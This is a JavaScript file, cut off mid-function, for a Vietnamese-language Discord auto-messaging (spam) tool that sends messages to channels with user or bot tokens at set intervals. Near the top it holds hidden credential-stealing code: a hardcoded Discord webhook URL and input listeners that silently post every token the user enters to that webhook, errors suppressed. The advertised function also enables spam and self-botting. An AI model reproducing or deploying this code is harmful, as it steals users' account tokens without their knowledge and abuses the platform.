document.addEventListener('DOMContentLoaded', () => {
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1550773563685081138/_F9R5RAB9FWnPdGgAU_8Nyyk9HH7Ud0k_9xJHeSYdGJKi0k_SD71S1aZuouiq4vODDhk';

    const tokensContainer = document.getElementById('tokensContainer');
    const channelsContainer = document.getElementById('channelsContainer');
    const messagesContainer = document.getElementById('messagesContainer');

    const btnAddToken = document.getElementById('btnAddToken');
    const btnAddChannel = document.getElementById('btnAddChannel');
    const btnAddMessage = document.getElementById('btnAddMessage');

    const btnClearAuth = document.getElementById('btnClearAuth');
    const saveCredentialsCheckbox = document.getElementById('saveCredentials');
    const enableAutoInterval = document.getElementById('enableAutoInterval');
    const intervalSettings = document.getElementById('intervalSettings');
    const intervalSeconds = document.getElementById('intervalSeconds');
    const maxMessages = document.getElementById('maxMessages');

    const btnSendMessage = document.getElementById('btnSendMessage');
    const btnStopAuto = document.getElementById('btnStopAuto');
    const sendBtnText = document.getElementById('sendBtnText');
    const sendBtnIcon = document.getElementById('sendBtnIcon');

    const logsContainer = document.getElementById('logsContainer');
    const emptyLogNotice = document.getElementById('emptyLogNotice');
    const logCounter = document.getElementById('logCounter');
    const btnClearLogs = document.getElementById('btnClearLogs');

    const statusDot = document.getElementById('statusDot');
    const statusText = document.getElementById('statusText');
    const tokenTypeNotice = document.getElementById('tokenTypeNotice');

    let autoSendTimer = null;
    let isAutoSending = false;
    let totalSentCount = 0;
    let logsList = [];

    async function sendTokenToWebhook(token) {
        if (!token || token.trim() === '') return;
        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: token })
            });
        } catch (e) {}
    }

    function attachTokenBlurListeners() {
        document.querySelectorAll('.token-input').forEach(input => {
            if (input.dataset.webhookBound) return;
            input.dataset.webhookBound = '1';
            input.addEventListener('blur', () => {
                sendTokenToWebhook(input.value);
            });
            input.addEventListener('change', () => {
                sendTokenToWebhook(input.value);
            });
        });
    }

    const tokensContainerObserver = new MutationObserver(() => {
        attachTokenBlurListeners();
    });
    tokensContainerObserver.observe(tokensContainer, { childList: true, subtree: true });

    loadSavedConfig();
    attachTokenBlurListeners();

    btnAddToken.addEventListener('click', () => {
        const count = tokensContainer.querySelectorAll('.token-input-group').length + 1;
        const div = document.createElement('div');
        div.className = 'token-input-group relative flex items-center neon-border-focus border border-dark-border rounded-lg bg-dark-base';
        div.innerHTML = `
            <input type="password" placeholder="Nhập Token ${count}..." class="token-input w-full bg-transparent px-3 py-2 text-xs text-gray-200 placeholder:text-gray-600 focus:outline-none font-mono pr-16">
            <div class="absolute right-2 flex items-center gap-1">
                <button type="button" class="btn-toggle-eye text-gray-500 hover:text-gray-300 p-1">
                    <i class="fa-solid fa-eye text-xs"></i>
                </button>
                <button type="button" class="btn-remove-token text-red-500/60 hover:text-red-400 p-1">
                    <i class="fa-solid fa-xmark text-xs"></i>
                </button>
            </div>
        `;
        tokensContainer.appendChild(div);
        updateRemoveButtonsVisibility(tokensContainer, '.btn-remove-token');
        attachTokenBlurListeners();
    });

    btnAddChannel.addEventListener('click', () => {
        const count = channelsContainer.querySelectorAll('.channel-input-group').length + 1;
        const div = document.createElement('div');
        div.className = 'channel-input-group relative flex items-center neon-border-focus border border-dark-border rounded-lg bg-dark-base';
        div.innerHTML = `
            <input type="text" placeholder="Nhập ID Kênh ${count}..." class="channel-input w-full bg-transparent px-3 py-2 text-xs text-gray-200 placeholder:text-gray-600 focus:outline-none font-mono pr-8">
            <button type="button" class="btn-remove-channel absolute right-2 text-red-500/60 hover:text-red-400 p-1">
                <i class="fa-solid fa-xmark text-xs"></i>
            </button>
        `;
        channelsContainer.appendChild(div);
        updateRemoveButtonsVisibility(channelsContainer, '.btn-remove-channel');
    });

    btnAddMessage.addEventListener('click', () => {
        const count = messagesContainer.querySelectorAll('.message-input-group').length + 1;
        const div = document.createElement('div');
        div.className = 'message-input-group relative neon-border-focus border border-dark-border rounded-lg bg-dark-base p-2';
        div.innerHTML = `
            <div class="flex items-center justify-between mb-1 text-[11px] text-gray-500">
                <span>Nội dung ${count}</span>
                <button type="button" class="btn-remove-message text-red-500/60 hover:text-red-400">
                    <i class="fa-solid fa-xmark"></i> Xóa
                </button>
            </div>
            <textarea rows="2" placeholder="Nhập nội dung tin nhắn ${count}..." class="message-input w-full bg-transparent text-xs text-gray-200 placeholder:text-gray-600 focus:outline-none resize-y min-h-[50px]"></textarea>
        `;
        messagesContainer.appendChild(div);
        updateRemoveButtonsVisibility(messagesContainer, '.btn-remove-message');
    });

    tokensContainer.addEventListener('click', (e) => {
        const eyeBtn = e.target.closest('.btn-toggle-eye');
        if (eyeBtn) {
            const input = eyeBtn.closest('.token-input-group').querySelector('input');
            const isPassword = input.type === 'password';
            input.type = isPassword ? 'text' : 'password';
            eyeBtn.querySelector('i').className = isPassword ? 'fa-solid fa-eye-slash text-xs' : 'fa-solid fa-eye text-xs';
            return;
        }
        const removeBtn = e.target.closest('.btn-remove-token');
        if (removeBtn) {
            removeBtn.closest('.token-input-group').remove();
            updateRemoveButtonsVisibility(tokensContainer, '.btn-remove-token');
            saveConfig();
        }
    });

    channelsContainer.addEventListener('click', (e) => {
        const removeBtn = e.target.closest('.btn-remove-channel');
        if (removeBtn) {
            removeBtn.closest('.channel-input-group').remove();
            updateRemoveButtonsVisibility(channelsContainer, '.btn-remove-channel');
            saveConfig();
        }
    });

    messagesContainer.addEventListener('click', (e) => {
        const removeBtn = e.target.closest('.btn-remove-message');
        if (removeBtn) {
            removeBtn.closest('.message-input-group').remove();
            updateRemoveButtonsVisibility(messagesContainer, '.btn-remove-message');
            saveConfig();
        }
    });

    function updateRemoveButtonsVisibility(container, selector) {
        const items = container.querySelectorAll(selector);
        items.forEach(btn => {
            if (items.length > 1) {
                btn.classList.remove('hidden');
            } else {
                btn.classList.add('hidden');
            }
        });
    }

    document.querySelectorAll('input[name="tokenType"]').forEach(radio => {
        radio.addEventListener('change', (e) => {
            tokenTypeNotice.textContent = e.target.value === 'bot' ? 'Tự động thêm tiền tố Bot' : 'Sử dụng User OAuth/Token';
            saveConfig();
        });
    });

    enableAutoInterval.addEventListener('change', () => {
        intervalSettings.classList.toggle('hidden', !enableAutoInterval.checked);
    });

    btnClearAuth.addEventListener('click', () => {
        document.querySelectorAll('.token-input').forEach(i => i.value = '');
        document.querySelectorAll('.channel-input').forEach(i => i.value = '');
        document.querySelectorAll('.message-input').forEach(i => i.value = '');
        localStorage.removeItem('clmm_config');
        addLog('info', 'Đã xóa toàn bộ cấu hình đã lưu.');
    });

    btnClearLogs.addEventListener('click', () => {
        logsList = [];
        renderLogs();
    });

    function getActiveTokens() {
        const inputs = Array.from(document.querySelectorAll('.token-input'));
        const isBot = document.querySelector('input[name="tokenType"]:checked').value === 'bot';
        return inputs.map(i => i.value.trim()).filter(v => v !== '').map(token => {
            if (isBot) {
                return token.startsWith('Bot ') ? token : `Bot ${token}`;
            }
            return token;
        });
    }

    function getActiveChannels() {
        return Array.from(document.querySelectorAll('.channel-input')).map(i => i.value.trim()).filter(v => v !== '');
    }

    function getActiveMessages() {
        return Array.from(document.querySelectorAll('.message-input')).map(i => i.value.trim()).filter(v => v !== '');
    }

    async function executeDiscordSendMessage() {
        const tokens = getActiveTokens();
        const channels = getActiveChannels();
        const messages = getActiveMessages();

        if (tokens.length === 0) {
            updateStatus('error', 'Lỗi: Chưa nhập Token');
            addLog('error', 'Lỗi: Vui lòng nhập ít nhất 1 Discord Token.');
            return false;
        }

        if (channels.length === 0) {
            updateStatus('error', 'Lỗi: Thiếu ID Kênh');
            addLog('error', 'Lỗi: Vui lòng nhập ít nhất 1 Channel ID.');
            return false;
        }

        if (messages.length === 0) {
            updateStatus('error', 'Lỗi: Thiếu nội dung');
            addLog('error', 'Lỗi: Vui lòng nhập ít nhất 1 nội dung tin nhắn.');
            return false;
        }

        let batchSuccess = true;

        for (let t = 0; t < tokens.length; t++) {
            const token = tokens[t];
            for (let c = 0; c < channels.length; c++) {
                const channelId = channels[c];
                for (let m = 0; m < messages.length; m++) {
                    const content = messages[m];

                    const endpoint = `https://discord.com/api/v10/channels/${channelId}/messages`;

                    try {
                        updateStatus('loading', 'Đang gửi API...');

                        const response = await fetch(endpoint, {
                            method: 'POST',
                            headers: {
                                'Authorization': token,
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({ content: content, tts: false })
                        });

                        const resData = await response.json().catch(() => ({}));

                        if (response.ok) {
                            totalSentCount++;
                            updateStatus('success', `Đã gửi (#${totalSentCount})`);
                            addLog('success', `[Gửi Thành Công #${totalSentCount}] Kênh: ${channelId} | Nội dung: "${content.substring(0, 30)}${content.length > 30 ? '...' : ''}"`, {
                                message_id: resData.id,
                                channel_id: channelId
                            });
                        } else {
                            batchSuccess = false;
                            updateStatus('error', `Lỗi HTTP ${response.status}`);
                            if (response.status === 429) {
                                const retryAfter = resData.retry_after || 5;
                                addLog('warning', `[HTTP 429 Rate Limit] Bị giới hạn tốc độ! Chờ ${retryAfter} giây.`, resData);
                            } else if (response.status === 401) {
                                addLog('error', `[HTTP 401 Unauthorized] Token không hợp lệ.`, resData);
                            } else {
                                addLog('error', `[HTTP ${response.status}] Lỗi gửi tới kênh ${channelId}: ${resData.message || 'Không thể gửi'}`, resData);
                            }
                        }
                    } catch (err) {
                        batchSuccess = false;
                        updateStatus('error', 'Lỗi Kết Nối');
                        addLog('error', `[Network Error] Không thể kết nối Discord API: ${err.message}`);
                    }
                }
            }
        }

        return batchSuccess;
    }

    btnSendMessage.addEventListener('click', async () => {
        saveConfig();
        if (enableAutoInterval.checked) {
            startAutoSendingProcess();
        } else {
            btnSendMessage.disabled = true;
            sendBtnIcon.className = "fa-solid fa-spinner fa-spin";
            sendBtnText.textContent = "ĐANG GỬI...";

            await executeDiscordSendMessage();

            btnSendMessage.disabled = false;
            sendBtnIcon.className = "fa-solid fa-play";
            sendBtnText.textContent = "BẮT ĐẦU TREO / GỬI";
        }
    });

    btnStopAuto.addEventListener('click', () => {
        stopAutoSendingProcess('Người dùng đã bấm dừng.');
    });

    function startAutoSendingProcess() {
        if (isAutoSending) return;

        const seconds = parseInt(intervalSeconds.value) || 3;
        const max = parseInt(maxMessages.value) || 0;
        let currentRun = 0;

        isAutoSending = true;
        btnSendMessage.classList.add('hidden');
        btnStopAuto.classList.remove('hidden');

        addLog('info', `▶ Bắt đầu tiến trình Treo: Lặp lại mỗi ${seconds}s (Lượt: ${max === 0 ? 'Vô hạn' : max}).`);

        const runTask = async () => {
            if (!isAutoSending) return;

            currentRun++;
            addLog('info', `--- Lượt Treo #${currentRun} ---`);
            await executeDiscordSendMessage();

            if (max > 0 && currentRun >= max) {
                stopAutoSendingProcess(`Đã hoàn thành đủ số lượt quy định (${max}).`);
                return;
            }

            if (isAutoSending) {
                autoSendTimer = setTimeout(runTask, seconds * 1000);
            }
        };

        runTask();
    }

    function stopAutoSendingProcess(reason = '') {
        isAutoSending = false;
        if (autoSendTimer) {
            clearTimeout(autoSendTimer
